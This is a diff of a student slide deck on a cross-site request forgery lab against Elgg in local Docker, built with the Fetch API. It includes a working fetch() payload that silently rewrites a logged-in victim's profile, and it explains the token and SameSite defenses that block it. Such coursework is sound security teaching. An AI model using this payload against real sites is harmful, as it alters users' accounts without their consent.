@@ -1,16 +1,17 @@
 % =====================================================================
-%  SLIDES (Beamer/metropolis) — CSRF on Elgg via Fetch API (English)
-%  Compile: xelatex slides_en.tex  (run 2x)
+%  SLIDES (Beamer/metropolis) — CSRF on Elgg with the Fetch API (English)
+%  Build: xelatex slides_en.tex  (run twice)
 % =====================================================================
 \documentclass[11pt,aspectratio=169]{beamer}
 \usetheme{metropolis}
-\metroset{progressbar=frametitle,numbering=fraction,block=fill}
+\metroset{progressbar=frametitle,numbering=fraction,block=fill,sectionpage=none}
 
 \usepackage{fontspec}
 \setsansfont{TeX Gyre Heros}
 \setmonofont{Noto Sans Mono}[Scale=0.82]
 \usepackage[english]{babel}
 
+% ---- Brand colours ----
 \definecolor{navy}{HTML}{1E3C72}
 \definecolor{brandblue}{HTML}{2A5298}
 \definecolor{accent}{HTML}{2563EB}
@@ -34,6 +35,7 @@
 \usepackage{tikz}
 \usetikzlibrary{arrows.meta,positioning,calc}
 \usepackage{booktabs}
+\usepackage{graphicx}
 \usepackage{listings}
 \definecolor{codebg}{HTML}{0F172A}\definecolor{codefg}{HTML}{E2E8F0}
 \definecolor{codekey}{HTML}{38BDF8}\definecolor{codestr}{HTML}{86EFAC}
@@ -51,25 +53,26 @@
 \newcommand{\yes}{\textcolor{success}{\ding{52}}}
 \newcommand{\no}{\textcolor{danger}{\ding{56}}}
 
-% English labels for the sequence diagram (before \input)
-\newcommand{\lblVictim}{Alice (victim) + Browser}
-\newcommand{\lblAttacker}{Attacker\\\texttt{attacker32.com}}
-\newcommand{\lblElgg}{Elgg\\\texttt{seed-server.com}}
-\newcommand{\lblSa}{1. Legitimate login}
-\newcommand{\lblSb}{2. Set-Cookie \texttt{Elgg=...}}
-\newcommand{\lblSc}{3. Unknowingly opens malicious page}
-\newcommand{\lblSd}{4. Returns \texttt{index.html} (Fetch script)}
-\newcommand{\lblNe}{5. Script auto-runs (\texttt{DOMContentLoaded})}
-\newcommand{\lblSf}{6. Fetch POST + cookie (\texttt{credentials:'include'})}
-\newcommand{\lblNg}{7. Valid cookie $\Rightarrow$ update About me}
-\newcommand{\lblSh}{8. Response 302 (opaque)}
-\newcommand{\lblSi}{9. Re-check profile $\to$ changed}
+% ---- diagram (English labels) ----
+\providecommand{\lblVictim}{Alice (victim) + Browser}
+\providecommand{\lblAttacker}{Attacker\\\texttt{attacker.csrf.localhost}}
+\providecommand{\lblElgg}{Elgg\\\texttt{elgg.csrf.localhost}}
+\providecommand{\lblSa}{1. Legitimate login}
+\providecommand{\lblSb}{2. Set-Cookie \texttt{Elgg=...}}
+\providecommand{\lblSc}{3. Victim opens malicious page}
+\providecommand{\lblSd}{4. Returns \texttt{index.html} (Fetch script)}
+\providecommand{\lblNe}{5. Script auto-runs (\texttt{DOMContentLoaded})}
+\providecommand{\lblSf}{6. Fetch POST + cookie (\texttt{credentials:'include'})}
+\providecommand{\lblNg}{7. Valid cookie $\Rightarrow$ About me updated}
+\providecommand{\lblSh}{8. Response 302 (opaque)}
+\providecommand{\lblSi}{9. Reload profile $\to$ changed}
 \input{diagram_flow}
 
-\title{CSRF attack on Elgg via Fetch API}
+% ---- Title metadata ----
+\title{Cross-Site Request Forgery on Elgg via the Fetch API}
 \subtitle{Replacing XMLHttpRequest / form submit with modern \texttt{fetch()}}
-\author{Group 3 — \textit{M1 · M2 · M3}}
-\institute{Information Systems Security}
+\author{Group 6 — Thanh (23001935) · Tri (23001939) · Thao (23001936)}
+\institute{Computer Security — VNU University of Science}
 \date{\today}
 
 \begin{document}
@@ -80,117 +83,168 @@
 \setbeamercolor{author}{fg=mist}\setbeamercolor{institute}{fg=mist}\setbeamercolor{date}{fg=mist}
 \begin{frame}[plain]\titlepage\end{frame}}
 
-\begin{frame}{Outline}
-  \setbeamertemplate{section in toc}[sections numbered]
-  \tableofcontents
-\end{frame}
-
-% ===============================================================
-\section{Team \& Overview}
-
-\begin{frame}{Task allocation (Group of 3 — two-tier model)}
-  \textbf{Tier 1 — Shared baseline (mandatory for 100\% of members):} each runs Docker, captures the packet, changes About me to their own ID, and joins a cross Q\&A on all 15 questions.
-  \vfill
+% ---------------------------------------------------------------
+\begin{frame}{Outline \& responsibilities}
   \begin{columns}[t]
-    \column{0.33\textwidth}
-      \begin{block}{M1 — Offensive}
-        \scriptsize Docker, packet capture, \texttt{index.html} + \texttt{exploit.py}. \\ Q\&A 4–8.
-      \end{block}
-    \column{0.33\textwidth}
-      \begin{block}{M2 — Browser/Defense}
-        \scriptsize Browser/CORS/SameSite analysis, recording \& editing. \\ Q\&A 1,3,10–14.
-      \end{block}
-    \column{0.33\textwidth}
-      \begin{block}{M3 — Research/Slides}
-        \scriptsize Slides, diagrams, report, defense verification. \\ Q\&A 2,9,15.
-      \end{block}
+    \column{0.52\textwidth}
+      \setbeamertemplate{section in toc}[sections numbered]
+      \tableofcontents
+    \column{0.46\textwidth}
+      \footnotesize
+      \textbf{Responsibilities (Group 6):}
+      \begin{itemize}\footnotesize
+        \item \textbf{Thanh} — theory, HTTP, defenses
+        \item \textbf{Tri} — Elgg, Docker, Fetch API, testing
+        \item \textbf{Thao} — evidence, slides, video
+      \end{itemize}
+      \scriptsize\color{slate} All members run Docker, capture the request, change About me to their own ID, and join the 15-question Q\&A.
   \end{columns}
 \end{frame}
 
+% ===============================================================
+\section{Overview \& Theory}
+
 \begin{frame}{What is CSRF?}
-  \alert{Cross-Site Request Forgery} — the attacker tricks a \emph{logged-in} victim's browser into sending a forged request to the target server.
+  \alert{Cross-Site Request Forgery} — the attacker tricks the victim's (logged-in) browser into sending a forged state-changing request to the target. No password, no cookie theft — it merely \emph{borrows} the session.
   \vfill
   \textbf{Three required conditions:}
   \begin{enumerate}
-    \item The victim has an active session (session cookie).
+    \item The victim has a valid session cookie.
     \item A state-changing action with \alert{predictable} parameters.
     \item The app \alert{lacks defenses} (no SameSite, no token).
   \end{enumerate}
   \vfill
-  \footnotesize\textbf{Goal:} change Alice's \emph{About me} field to \texttt{CSRF attack by <ID>}.
+  \footnotesize\textbf{Goal:} change Alice's \emph{About me} to \texttt{CSRF attack by 23001939}.
+\end{frame}
+
+\begin{frame}{Same-site vs cross-site \& the core gap}
+  \footnotesize
+  \begin{tabular}{lll}
+    \toprule
+    \textbf{Concept} & \textbf{Definition} & \textbf{Lab example}\\
+    \midrule
+    Same-origin & scheme+host+port & elgg\ldots:8080 with itself\\
+    Same-site & same site (eTLD+1) & attacker.csrf.localhost \& elgg.csrf.localhost\\
+    Cross-site & different site & 127.0.0.1 vs elgg.csrf.localhost\\
+    \bottomrule
+  \end{tabular}
+  \vfill
+  \begin{alertblock}{The ``can send but cannot read'' gap}
+    \footnotesize SOP forbids JS from \emph{reading} a cross-origin response, but \textbf{not} from \emph{sending} a request. CSRF only needs the action executed — not the result read. Hence \texttt{mode:'no-cors'} (opaque) is enough.
+  \end{alertblock}
+\end{frame}
+
+\begin{frame}{Two experimental environments}
+  \footnotesize
+  \begin{columns}[t]
+    \column{0.46\textwidth}
+      \begin{block}{Standard SEED model (conceptual)}
+        \scriptsize www.seed-server.com + www.attacker32.com — theoretical reference frame.
+      \end{block}
+    \column{0.52\textwidth}
+      \begin{exampleblock}{Our real Docker lab (executed)}
+        \scriptsize Elgg \textbf{3.3.3} @ elgg.csrf.localhost:8080\\
+        Same-site attacker @ attacker.csrf.localhost:8000\\
+        Cross-site attacker @ 127.0.0.1:8000\\
+        Two modes: \texttt{protected} / \texttt{vulnerable}
+      \end{exampleblock}
+  \end{columns}
+  \vfill
+  \begin{block}{Why two attacker hosts?}
+    \scriptsize Change \alert{exactly one variable} (same-site $\leftrightarrow$ cross-site) to isolate the role of the \texttt{SameSite} cookie from the anti-CSRF token.
+  \end{block}
 \end{frame}
 
 % ===============================================================
 \section{Fetch API attack technique}
 
-\begin{frame}{Improvement: from XHR/Form to Fetch API}
+\begin{frame}{Upgrade requirement: from XHR/form to Fetch API}
   \begin{center}\footnotesize
   \begin{tabular}{lccc}
     \toprule
     \textbf{Criterion} & \textbf{Form submit} & \textbf{XHR} & \textbf{Fetch API}\\
     \midrule
-    Stealth (no page change) & \no & \yes & \yes\\
+    Stealthy (no page change) & \no & \yes & \yes\\
     Modern syntax (async) & \no & \no & \yes\\
-    Assignment & \no{} banned & \no{} banned & \yes{} required\\
+    Assignment requirement & \no{} banned & \no{} banned & \yes{} required\\
     \bottomrule
   \end{tabular}
   \end{center}
   \medskip
   \begin{alertblock}{Two key flags}
     \footnotesize
-    \texttt{credentials: 'include'} → forces the browser to attach the session cookie cross-origin.\\
-    \texttt{mode: 'no-cors'} + urlencoded/FormData → Simple Request, \alert{no} Preflight.
+    \texttt{credentials: 'include'} → force the browser to attach the cross-origin session cookie.\\
+    \texttt{mode: 'no-cors'} + urlencoded/FormData → Simple Request, \alert{no} Preflight OPTIONS.
   \end{alertblock}
 \end{frame}
 
 \begin{frame}[fragile]{Packet analysis \& exploit code}
-  \scriptsize Endpoint: \texttt{POST http://www.seed-server.com/action/profile/edit}
+  \scriptsize Endpoint (real lab): \texttt{POST http://elgg.csrf.localhost:8080/action/profile/edit}
   \begin{lstlisting}[language=JS]
 const payload = new URLSearchParams();
 payload.append('name', 'Alice');
-payload.append('description', '<p>CSRF attack by B21DCCN001</p>');
+payload.append('description', 'CSRF attack by 23001939');
 payload.append('accesslevel[description]', '2');   // 2 = Public
-payload.append('guid', '42');                       // Alice's GUID
-fetch('http://www.seed-server.com/action/profile/edit', {
+payload.append('guid', '56');                       // Alice's GUID
+fetch('http://elgg.csrf.localhost:8080/action/profile/edit', {
   method: 'POST',
   mode: 'no-cors',          // Simple Request -> no Preflight
   credentials: 'include',   // REQUIRED: attach session cookie
-  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-  body: payload
+  body: payload             // URLSearchParams sets a safe Content-Type
 });
   \end{lstlisting}
-  \footnotesize \texttt{FormData} variant: do not set \texttt{Content-Type} manually (browser generates the boundary).
+  \footnotesize \texttt{FormData} variant: never set \texttt{Content-Type} manually (browser generates the boundary).
 \end{frame}
 
 % ===============================================================
-\section{Attack flow \& Results}
+\section{Results \& Defenses}
 
-\begin{frame}{Attack flow diagram}
+\begin{frame}{Attack sequence diagram}
   \begin{center}
   \scalebox{0.58}{\csrfflowdiagram}
   \end{center}
 \end{frame}
 
-\begin{frame}{Experimental evidence}
-  \begin{columns}[t]
-    \column{0.33\textwidth}\centering
-      \fbox{\parbox[c][2.6cm][c]{\linewidth}{\centering\scriptsize\textbf{Before}\\[3pt]Original About me}}
-      \\[4pt]\scriptsize Alice's original profile
-    \column{0.33\textwidth}\centering
-      \fbox{\parbox[c][2.6cm][c]{\linewidth}{\centering\scriptsize\textbf{During}\\[3pt]F12 console: Fetch POST}}
-      \\[4pt]\scriptsize Silent, no page change
-    \column{0.33\textwidth}\centering
-      \fbox{\parbox[c][2.6cm][c]{\linewidth}{\centering\scriptsize\textbf{After}\\[3pt]\texttt{CSRF attack by <ID>}}}
-      \\[4pt]\scriptsize About me changed
+\begin{frame}{Experimental evidence (real screenshots, Elgg 3.3.3)}
+  \begin{columns}[c]
+    \column{0.34\textwidth}\centering
+      \includegraphics[width=\linewidth]{img/ev-before.jpg}
+      \\[2pt]\scriptsize\textbf{Before:} baseline About me
+    \column{0.34\textwidth}\centering
+      \includegraphics[width=\linewidth]{img/ev-protected-blocked.jpg}
+      \\[2pt]\scriptsize\textbf{Protected:} \alert{``missing \_\_token''}
+    \column{0.34\textwidth}\centering
+      \includegraphics[width=\linewidth]{img/ev-after-success.jpg}
+      \\[2pt]\scriptsize\textbf{After (vulnerable):} changed
   \end{columns}
   \vfill
-  \begin{exampleblock}{Result}
-    \small Fully successful attack — no warning, no redirect (undefended configuration).
+  \begin{exampleblock}{Result matrix}
+    \scriptsize
+    \begin{tabular}{llcc}
+      protected · same-site & token on & \textbf{blocked} & \no{} change\\
+      vulnerable · cross-site & SameSite & \textbf{blocked} & \no{} change\\
+      vulnerable · same-site & token off & \textbf{success} & \yes{} change\\
+    \end{tabular}
   \end{exampleblock}
 \end{frame}
 
-% ===============================================================
-\section{Defense \& Conclusion}
+\begin{frame}{Two defenses — proven independently}
+  \footnotesize
+  \begin{columns}[t]
+    \column{0.5\textwidth}
+      \begin{block}{Anti-CSRF token (server)}
+        \scriptsize Attacker cannot read the token (SOP) $\Rightarrow$ forged request lacks it $\Rightarrow$ Elgg rejects: \alert{``Form is missing \_\_token''}.
+      \end{block}
+    \column{0.5\textwidth}
+      \begin{block}{SameSite cookie (browser)}
+        \scriptsize Even with the token off, a \emph{cross-site} POST carries no session cookie $\Rightarrow$ Elgg sees a stranger $\Rightarrow$ profile unchanged.
+      \end{block}
+  \end{columns}
+  \vfill
+  \begin{alertblock}{Technical finding}
+    \scriptsize About me is stored as the \emph{annotation} \texttt{profile:description}, not the metadata \texttt{\$user->description} $\Rightarrow$ the \texttt{reset-profile} tool reset the wrong table. Lesson: trust only directly-verified evidence.
+  \end{alertblock}
+\end{frame}
 
 \begin{frame}{Defense-in-Depth}
   \footnotesize
@@ -198,7 +252,7 @@ fetch('http://www.seed-server.com/action/profile/edit', {
     \toprule
     \textbf{Layer} & \textbf{Measure}\\
     \midrule
-    Cookie & \texttt{SameSite=Lax/Strict} — no cookies sent cross-site\\
+    Cookie & \texttt{SameSite=Lax/Strict} — no cross-site cookie\\
     Application & Anti-CSRF token — attacker cannot read it (SOP)\\
     Application & Double Submit Cookie\\
     Header & Check \texttt{Origin} / \texttt{Sec-Fetch-Site}\\
@@ -206,21 +260,21 @@ fetch('http://www.seed-server.com/action/profile/edit', {
     \bottomrule
   \end{tabular}
   \medskip
-  \begin{block}{Defense evidence}
-    \footnotesize Re-enable Elgg's anti-CSRF token → the same payload \alert{fails} (missing \texttt{\_\_elgg\_token}). About me \textbf{unchanged}.
+  \begin{block}{Recommendation}
+    \footnotesize \texttt{SameSite=Lax} + anti-CSRF token + \texttt{Origin} check on sensitive endpoints. Never use \texttt{GET} for state-changing actions.
   \end{block}
 \end{frame}
 
-\begin{frame}{AI disclosure \& Conclusion}
-  \textbf{AI-usage disclosure:}
+\begin{frame}{AI disclosure \& conclusion}
+  \textbf{AI usage levels:}
   \begin{itemize}\small
-    \item \textbf{Level 1:} debated CORS/Simple Request mechanisms — students coded themselves.
-    \item \textbf{Level 2:} AI co-created formatting and diagrams following the group's design.
-    \item \textbf{Level 3:} AI generated the \texttt{exploit.py}/template skeleton; the group configured \& tested.
+    \item \textbf{Level 1:} discuss CORS/Simple Request mechanics — students write the code.
+    \item \textbf{Level 2:} AI co-creates formatting/diagrams following the group's design.
+    \item \textbf{Level 3:} AI helps scaffold tooling \& test automation; the group configures, runs, and owns the results.
   \end{itemize}
   \vfill
   \begin{alertblock}{Core message}
-    \small CSRF is \textbf{not} stopped by HTTPS. The fundamental fix: \texttt{SameSite} cookies + anti-CSRF token + request-origin checks. \textit{Learn attacks to defend.}
+    \small CSRF is \textbf{not} stopped by HTTPS. The real fix: \texttt{SameSite} cookies + anti-CSRF tokens + request-origin checks. \textit{Learn to attack in order to defend.}
   \end{alertblock}
 \end{frame}
 
